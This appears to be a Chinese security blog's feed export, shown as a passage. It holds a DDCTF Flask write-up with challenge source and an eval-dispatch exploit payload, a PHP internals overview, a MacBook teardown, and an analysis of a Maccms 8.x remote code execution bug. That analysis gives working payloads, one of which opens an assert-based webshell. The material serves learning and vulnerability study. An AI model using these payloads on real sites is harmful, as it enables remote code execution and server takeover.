/&gt;&apos;</span><br><span class="line">elif page == &apos;shop&apos;:</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">elif page == &apos;reset&apos;:</span><br><span class="line">del session[&apos;num_items&apos;]</span><br><span class="line">html += &apos;Session reset.&lt;br /&gt;&apos;</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">return html</span><br><span class="line"></span><br><span class="line">def index_handler(args):</span><br><span class="line">bool_show_source = str(args[0])</span><br><span class="line">bool_download_source = str(args[1])</span><br><span class="line">if bool_show_source == &apos;True&apos;:</span><br><span class="line"></span><br><span class="line">source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)</span><br><span class="line">html = &apos;&apos;</span><br><span class="line">if bool_download_source != &apos;True&apos;:</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line"></span><br><span class="line">for line in source:</span><br><span class="line">if bool_download_source != &apos;True&apos;:</span><br><span class="line">html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)</span><br><span class="line">else:</span><br><span class="line">html += line</span><br><span class="line">source.close()</span><br><span class="line"></span><br><span class="line">if bool_download_source == &apos;True&apos;:</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;</span><br><span class="line">headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;</span><br><span class="line">return Response(html, headers=headers)</span><br><span class="line">else:</span><br><span class="line">return html</span><br><span class="line">else:</span><br><span class="line">trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line">def buy_handler(args):</span><br><span class="line">num_items = int(args[0])</span><br><span class="line">if num_items &lt;= 0: return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">session[&apos;num_items&apos;] += num_items </span><br><span class="line">trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(num_items), &apos;action:view;index&apos;])</span><br><span class="line"></span><br><span class="line">def consume_point_function(args):</span><br><span class="line">point_to_consume = int(args[0])</span><br><span class="line">if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException()</span><br><span class="line">session[&apos;points&apos;] -= point_to_consume</span><br><span class="line"></span><br><span class="line">def show_flag_function(args):</span><br><span class="line">flag = args[0]</span><br><span class="line">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br><span class="line">return &apos;You naughty boy! ;) &lt;br /&gt;&apos;</span><br><span class="line"></span><br><span class="line">def get_flag_handler(args):</span><br><span class="line">if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries</span><br><span class="line">trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">app.run(debug=False, host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p><p>这个我看的挺久了，不是很完全明白，payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure></p><p>它大致思路是，首先从路由@app.route(url_prefix+’/‘)开始，也就是开始分析该下面的entry_point()函数，它要求获取?后面的字符串，然后调用trigger_event()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(event):   </span><br><span class="line">    session[&apos;log&apos;].append(event)</span><br><span class="line">    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]  # 如果session[&apos;log&apos;]列表的后五个成员。</span><br><span class="line">    if type(event) == type([]):   </span><br><span class="line">        request.event_queue += event</span><br><span class="line">    else:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>之后就是执行execute_event_loop()函数了，大致是要求传入有action或func的字符串，漏洞发生点在eval</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) </span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>大致意思是这个函数会循环提取队列中的字符串，最终由get_mid_str函数提取出函数名和参数，然后把函数名用eval与_handler或者_function拼接，接着执行该函数</p><p>这个execute_event_loop()里面有个while，是能在满足条件的情况下，多次循环的原因吧，这里的action按照payload来说是trigger_event#,args是[‘action:buy;10’, ‘action:get_flag;’, ‘a:show_flag;1’]</p><p>trigger_event是支持传入列表的，那么我们可以调用名为trigger_event的函数，参数为先buy后get_flag即可。</p><p>然后就是得到的cookie解密一下即可。</p><p>相关文章参考：<a href="https://www.360zhijia.com/anquan/460259.html" target="_blank" rel="noopener">https://www.360zhijia.com/anquan/460259.html</a></p><p><a href="https://www.jianshu.com/p/cf4582c5afa5" target="_blank" rel="noopener">https://www.jianshu.com/p/cf4582c5afa5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;上个月打了个DDCTF，遇到了python flask的题，还没好好做个总结理解，这里记录一下。&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP底层的运行机制与原理</title>
    <link href="http://yoursite.com/2019/05/10/phpbottom/"/>
    <id>http://yoursite.com/2019/05/10/phpbottom/</id>
    <published>2019-05-10T06:58:51.471Z</published>
    <updated>2019-05-10T07:55:31.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近写PHP代码比较多，也算不上什么精通，感觉要使用php就得知道这门语言的底层原理，这里决定了解一下PHP底层的工作原理。</p><h2 id="0x02-什么是PHP"><a href="#0x02-什么是PHP" class="headerlink" title="0x02 什么是PHP"></a>0x02 什么是PHP</h2><p>PHP是一种适用于Web开发的动态语言，是一个用C语言实现，包含大量组件的软件框架。狭义方面来说，可以说是个UI框架(用户界面,也可以说是UI模版<a href="https://www.eefocus.com/yitianzhaohai1/blog/17-03/409354_eaccc.html" target="_blank" rel="noopener">(UI定义)</a>)</p><h2 id="0x03-PHP设计理念与特点"><a href="#0x03-PHP设计理念与特点" class="headerlink" title="0x03 PHP设计理念与特点"></a>0x03 PHP设计理念与特点</h2><ul><li>多进程模型：由于PHP是多进程模型，不同请求间互不干涉，这样保证了一个请求挂掉不会对全盘服务造成影响，当然，随着时代发展，PHP也早已支持多线程模型。</li><li>弱类型语言：和C/C++、Java、C#等语言不同，PHP是一门弱类型语言。一个变量的类型并不是一开始就确定不变，运行中才会确定并可能发生隐式或显式的类型转换，这种机制的灵活性在web开发中非常方便、高效.</li><li>引擎(Zend)+组件(ext)的模式降低内部耦合。</li><li>中间层(sapi)隔绝web server和PHP。</li><li>语法简单灵活，没有太多规范。</li></ul><h2 id="0x04-PHP核心架构"><a href="#0x04-PHP核心架构" class="headerlink" title="0x04 PHP核心架构"></a>0x04 PHP核心架构</h2><p>php四层体系如下：<br><img src="https://s2.ax1x.com/2019/05/10/ERQZlD.jpg" alt="image"></p><p>从下到上的四层体系:</p><ul><li>Zend引擎：Zend整体用C语言实现，是PHP的内核部分。它将PHP代码翻译，实现了基本的数据结构，内存分配机制及管理，提供了相应的api供外部调用，是一切的核心。</li><li>Extensions：围绕Zend引擎，extensions通过组件式的方式提供各种基础服务，我们常见的各种内置函数、标准库等都是通过 extension来实现，用户也可以根据需要实现自己的extension。</li><li>Sapi：Aerver Application Programming Interface，即服务端应用编程接口，是PHP和web server的中间层。Sapi通过钩子函数，使PHP能和外部交互数据，这也将PHP和上层应用解耦。</li><li>上层应用：就是我们平时编写的PHP程序，通过不同的sapi方式得到各种各样的应用模式</li></ul><p>这里有个很好的通俗比喻:如果PHP是一辆车，那么车的框架就是PHP本身，Zend是车的引擎（发动机），Extensions下面的各种组件就是车的轮子，Sapi可以看做是公路，车可以跑在不同类型的公路上，而一次PHP程序的执行就是汽车跑在公路上。因此，我们需要：性能优异的引擎+合适的车轮+正确的跑道。</p><h2 id="0x05-Sapi"><a href="#0x05-Sapi" class="headerlink" title="0x05 Sapi"></a>0x05 Sapi</h2><p>常见的Sapi有：</p><ul><li>apache2handler：以apache作为webserver，采用mod_PHP模式运行时候的处理方式，也是现在应用最广泛的一种。</li><li>fast-cgi：这是webserver和PHP直接的另一种交互方式，也就是大名鼎鼎的fastcgi协议，在最近fastcgi+PHP得到越来越多的应用，也是异步webserver所唯一支持的方式。nginx就是通过php-fpm(fast-cgi)来解析php的。</li><li>cli：命令行调用的应用模式</li></ul><h2 id="0x06-PHP执行流程"><a href="#0x06-PHP执行流程" class="headerlink" title="0x06 PHP执行流程"></a>0x06 PHP执行流程</h2><p><img src="https://s2.ax1x.com/2019/05/10/ERGBSP.jpg" alt="image"></p><p>拿到一段代码后，经过词法解析、语法解析等阶段后，源程序会被翻译成一个个指令（opcodes）,然后ZEND虚拟机顺次执行这些指令完成操作。PHP本身是用C实现的，因此最终调用的也是C的函数，实际上，我们可以把PHP看做一个C开发的软件。</p><p>PHP的执行的核心是翻译出来的一条一条指令，也即opcode。</p><p>Opcode是PHP程序执行的最基本单位。一个opcode由两个参数(op1,op2)、返回值和处理函数组成。PHP程序最终被翻译为一组opcode处理函数的顺序执行。</p><h2 id="0x07-PHP变量"><a href="#0x07-PHP变量" class="headerlink" title="0x07 PHP变量"></a>0x07 PHP变量</h2><p>PHP是一门弱类型语言，本身不严格区分变量的类型。PHP变量可以分为简单类型(int、string、boolean)、集合类型(array、resource、object)和常量(const)。所有变量在底层都是同一种结构zval。</p><p>zval主要由三部分组成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type：指定变量的类型</span><br><span class="line">refcount&amp;is_ref：用来实现引用计数</span><br><span class="line">value：存储变量的实际数据(核心)。因为要存储多种类型，所以zvalue是一个union，也由此实现了弱类型。</span><br></pre></td></tr></table></figure><h2 id="0x08-相关文章"><a href="#0x08-相关文章" class="headerlink" title="0x08 相关文章"></a>0x08 相关文章</h2><p><a href="https://sphenginx.github.io/2016/07/11/php-theory/" target="_blank" rel="noopener">https://sphenginx.github.io/2016/07/11/php-theory/</a></p><p><a href="https://seminelee.github.io/2017/11/19/php/" target="_blank" rel="noopener">https://seminelee.github.io/2017/11/19/php/</a></p><p><a href="http://www.nowamagic.net/librarys/veda/detail/102" target="_blank" rel="noopener">http://www.nowamagic.net/librarys/veda/detail/102</a></p><p>具体内容可以参考上面几篇文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;最近写PHP代码比较多，也算不上什么精通，感觉要使用php就得知道这门语言的底层原理，这里决定了解一
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>记一次mac pro 拆机经历</title>
    <link href="http://yoursite.com/2019/05/09/mac%20pro/"/>
    <id>http://yoursite.com/2019/05/09/mac%20pro/</id>
    <published>2019-05-09T07:15:11.238Z</published>
    <updated>2019-05-09T07:41:30.199Z</updated>
    
    <content type="html"><![CDATA[<p>在下的电脑是<br>MacBook Pro (Retina, 13-inch, Late 2012)的</p><p><img src="https://s2.ax1x.com/2019/05/09/Egl99U.jpg" alt="image"></p><p>确实是有点老了，而且感觉内存不够用，看看一哈能不能加个内存条<br>，上网搜了一下</p><p><img src="https://s2.ax1x.com/2019/05/09/Egla8S.png" alt="image"></p><p>发现没有匹配2012末的，而且也说retina是属于把内存条和主盘牢牢焊死的，无法拆开，到这里仍有些不相信，决定拆开机盘看一下:</p><p><img src="https://s2.ax1x.com/2019/05/09/Eg1CIP.jpg" alt="image"></p><p>刚打开时全是灰，清理了一下灰后</p><p>仔细看了下确实基本都是焊死的，无从下手，好吧就这样，等以后自己赚钱了再买一台更大的内存mac pro好吧。</p><p>然后有学长问这是不是固态磁盘，我查了下磁盘还分普通磁盘和固态磁盘，查看了一下本机</p><p><img src="https://s2.ax1x.com/2019/05/09/Eg3xAI.jpg" alt="image"></p><p>还好还是个ssd固态磁盘，暂时继续用2012mac了~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在下的电脑是&lt;br&gt;MacBook Pro (Retina, 13-inch, Late 2012)的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/09/Egl99U.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;确实是有点
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Maccms8.x命令执行漏洞</title>
    <link href="http://yoursite.com/2019/05/08/maccms8x/"/>
    <id>http://yoursite.com/2019/05/08/maccms8x/</id>
    <published>2019-05-08T12:00:07.664Z</published>
    <updated>2019-05-09T06:51:11.187Z</updated>
    
    <content type="html"><![CDATA[<p>maccms8.x下载链接：<br><a href="https://share.weiyun.com/23802397ed25681ad45c112bf34cc6db" target="_blank" rel="noopener">https://share.weiyun.com/23802397ed25681ad45c112bf34cc6db</a></p><p>两个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/maccms_php_v8/index.php?m=vod-search&amp;wd=&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/maccms/index.php?m=vod-search&amp;wd=</span><br><span class="line">&#123;if-A:assert($_POST[a])&#125;&#123;endif-A&#125;</span><br></pre></td></tr></table></figure></p><p>测试效果如图(第一种payload):<br><img src="https://s2.ax1x.com/2019/05/09/EgnaIU.jpg" alt="image"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞发生在/inc/common/template.php 文件类ifex()方法中的eval处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else&#123;</span><br><span class="line">    @eval(&quot;if($strif)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $this-&gt;H=str_replace($iar[0][$m],$strThen,$this-&gt;H);&#125;</span><br><span class="line">    else &#123; $this-&gt;H=str_replace($iar[0][$m],&quot;&quot;,$this-&gt;H); &#125;</span><br></pre></td></tr></table></figure></p><h3 id="正向分析"><a href="#正向分析" class="headerlink" title="正向分析"></a>正向分析</h3><p>首先在index.php开头require(“inc/conn.php”);,然后conn.php也包含了/inc/common/template.php文件，该文件会新建一个模版对象tpl，大致代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/template.php</span><br><span class="line">&lt;?php</span><br><span class="line">class AppTpl</span><br><span class="line">&#123;</span><br><span class="line">    var $markname,$markpar,$markdes,$markval,$markhtml;</span><br><span class="line">    function AppTpl()</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;P = array(&quot;vodtypeid&quot;=&gt;-1,&quot;vodtypepid&quot;=&gt;-1,&quot;vodtopicid&quot;=&gt;-1,&quot;arttypeid&quot;=&gt;-1,&quot;arttypepid&quot;=&gt;-1,&quot;arttopicid&quot;=&gt;-1,&quot;auto&quot;=&gt;false,&quot;pg&quot;=&gt;1);</span><br><span class="line">&#125;</span><br><span class="line">...... 此处省略n行代码</span><br><span class="line">$tpl = new AppTpl();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>继续回到index.php &emsp;第15行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$m = be(&apos;get&apos;,&apos;m&apos;);</span><br></pre></td></tr></table></figure><p>be函数的定义可以在 /inc/common/function.php 第257行找到<br>主要作用是对用户的请求数据进行消毒，防止sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/function.php</span><br><span class="line">function be($mode,$key,$sp=&apos;,&apos;)</span><br><span class="line">&#123;</span><br><span class="line">$magicq= get_magic_quotes_gpc();</span><br><span class="line">switch($mode)</span><br><span class="line">&#123;</span><br><span class="line">case &apos;post&apos;:</span><br><span class="line">$res=isset($_POST[$key]) ? $magicq?$_POST[$key]:@addslashes($_POST[$key]) : &apos;&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;get&apos;:</span><br><span class="line">$res=isset($_GET[$key]) ? $magicq?$_GET[$key]:@addslashes($_GET[$key]) : &apos;&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;arr&apos;:</span><br><span class="line">$arr =isset($_POST[$key]) ? $_POST[$key] : &apos;&apos;;</span><br><span class="line">if($arr==&quot;&quot;)&#123;</span><br><span class="line">$value=&quot;0&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">for($i=0;$i&lt;count($arr);$i++)&#123;</span><br><span class="line">$res=implode($sp,$arr);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">$res=isset($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] : @addslashes($_REQUEST[$key]) : &apos;&apos;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return $res;</span><br><span class="line">&#125;ini_set(&quot;magic_quotes_runtime&quot;, 0);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ./index.php</span><br><span class="line">......</span><br><span class="line">require(&quot;inc/conn.php&quot;);</span><br><span class="line">require(MAC_ROOT.&apos;/inc/common/360_safe3.php&apos;);</span><br><span class="line">$m = be(&apos;get&apos;,&apos;m&apos;);</span><br><span class="line">if(strpos($m,&apos;.&apos;))&#123; $m = substr($m,0,strpos($m,&apos;.&apos;)); &#125;</span><br><span class="line">$par = explode(&apos;-&apos;,$m);</span><br><span class="line">$parlen = count($par);</span><br><span class="line">$ac = $par[0];</span><br><span class="line">......</span><br><span class="line">$acs = array(&apos;vod&apos;,&apos;art&apos;,&apos;map&apos;,&apos;user&apos;,&apos;gbook&apos;,&apos;comment&apos;,&apos;label&apos;);</span><br><span class="line">if(in_array($ac,$acs))&#123;</span><br><span class="line">    $tpl-&gt;P[&quot;module&quot;] = $ac;</span><br><span class="line">    include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>be函数之后进行explode分割-之后，也就是说?m=vod-search最后变成包含/inc/module/vod.php,且$method=search,这里分析一下vod.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># /inc/module/vod.php</span><br><span class="line"></span><br><span class="line">elseif($method==&apos;search&apos;)</span><br><span class="line">&#123;</span><br><span class="line">$tpl-&gt;P[&quot;siteaid&quot;] = 15;</span><br><span class="line">$wd = be(&quot;all&quot;, &quot;wd&quot;);</span><br><span class="line">if(!empty($wd))&#123; $tpl-&gt;P[&quot;wd&quot;] = $wd; &#125;</span><br><span class="line"></span><br><span class="line">    if ( $tpl-&gt;P[&apos;pg&apos;]==1 &amp;&amp; getTimeSpan(&quot;last_searchtime&quot;) &lt; $MAC[&apos;app&apos;][&apos;searchtime&apos;])&#123; </span><br><span class="line">showMsg(&quot;请不要频繁操作，时间间隔为&quot;.$MAC[&apos;app&apos;][&apos;searchtime&apos;].&quot;秒&quot;,MAC_PATH);</span><br><span class="line">exit;</span><br><span class="line">......</span><br><span class="line">    $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;);</span><br><span class="line">    $tpl-&gt;mark();</span><br><span class="line">    $tpl-&gt;pageshow();</span><br><span class="line"></span><br><span class="line">    $colarr = array(&apos;&#123;page:des&#125;&apos;,&apos;&#123;page:key&#125;&apos;,&apos;&#123;page:now&#125;&apos;,&apos;&#123;page:order&#125;&apos;,&apos;&#123;page:by&#125;&apos;,&apos;&#123;page:wd&#125;&apos;,&apos;&#123;page:wdencode&#125;&apos;,&apos;&#123;page:pinyin&#125;&apos;,&apos;&#123;page:letter&#125;&apos;,&apos;&#123;page:year&#125;&apos;,&apos;&#123;page:starring&#125;&apos;,&apos;&#123;page:starringencode&#125;&apos;,&apos;&#123;page:directed&#125;&apos;,&apos;&#123;page:directedencode&#125;&apos;,&apos;&#123;page:area&#125;&apos;,&apos;&#123;page:areaencode&#125;&apos;,&apos;&#123;page:lang&#125;&apos;,&apos;&#123;page:langencode&#125;&apos;,&apos;&#123;page:typeid&#125;&apos;,&apos;&#123;page:typepid&#125;&apos;,&apos;&#123;page:classid&#125;&apos;);</span><br><span class="line">$valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&apos;year&apos;]==0?&apos;&apos;:$tpl-&gt;P[&apos;year&apos;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&apos;typeid&apos;],$tpl-&gt;P[&apos;typepid&apos;] ,$tpl-&gt;P[&apos;classid&apos;]  );</span><br><span class="line"></span><br><span class="line">$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</span><br></pre></td></tr></table></figure><p>$tpl-&gt;P[“wd”]等于’{if-A:phpinfo()}{endif-A}’;<br>且$tpl-&gt;H等于/template/paody/html/vod_search.html中的内容，<br>$tpl-&gt;H的内容也做了个替换，所有形式如：{xxx:xxx}会被替换成{if-A:phpinfo()}{endif-A} </p><p>再看一下index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ./index.php</span><br><span class="line"></span><br><span class="line">    include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;</span><br><span class="line">......</span><br><span class="line">    $tpl-&gt;ifex();</span><br><span class="line">    if(!empty($tpl-&gt;P[&apos;cp&apos;]))&#123; setPageCache($tpl-&gt;P[&apos;cp&apos;],$tpl-&gt;P[&apos;cn&apos;],$tpl-&gt;H); &#125;</span><br><span class="line">$tpl-&gt;run();</span><br><span class="line">echo $tpl-&gt;H;</span><br></pre></td></tr></table></figure><p>最后还调用了ifex()方法，也就是我们开头提到的漏洞发生处，/inc/common/template.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/template.php</span><br><span class="line">function ifex()</span><br><span class="line">&#123;</span><br><span class="line">    if (!strpos(&quot;,&quot;.$this-&gt;H,&quot;&#123;if-&quot;)) &#123; return; &#125;</span><br><span class="line">    $labelRule = buildregx(&apos;&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;&apos;,&quot;is&quot;);</span><br><span class="line">    preg_match_all($labelRule,$this-&gt;H,$iar);</span><br><span class="line">    $arlen=count($iar[2]);</span><br><span class="line"></span><br><span class="line">    for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">    $strn = $iar[1][$m];</span><br><span class="line">    $strif= asp2phpif( $iar[2][$m] ) ;</span><br><span class="line">    $strThen= $iar[3][$m];</span><br><span class="line">    $elseifFlag=false;</span><br><span class="line"></span><br><span class="line">    $labelRule2=&quot;&#123;elseif-&quot;.$strn.&quot;&quot;;</span><br><span class="line">    $labelRule3=&quot;&#123;else-&quot;.$strn.&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">    if (strpos(&quot;,&quot;.$strThen,$labelRule2)&gt;0)&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $ifFlag = false;</span><br><span class="line">        if (strpos(&quot;,&quot;.$strThen,$labelRule3)&gt;0)&#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            @eval(&quot;if($strif)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">            .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第863行中的$this-&gt;H 在 /inc/module/vod.php文件中已定义。</span><br><span class="line">第864行中的$labelRule 等于 /&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;/is，</span><br><span class="line">第865行中用preg_match_all()进行全局正则匹配，在$this-&gt;H中用这个pattern匹配，结果是一个二维数组，存储在$iar中。而payload中的phpinfo()将存储在$iar[2]中。这里测试一下:</span><br></pre></td></tr></table></figure><p>本地搭建的代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$labelRule = 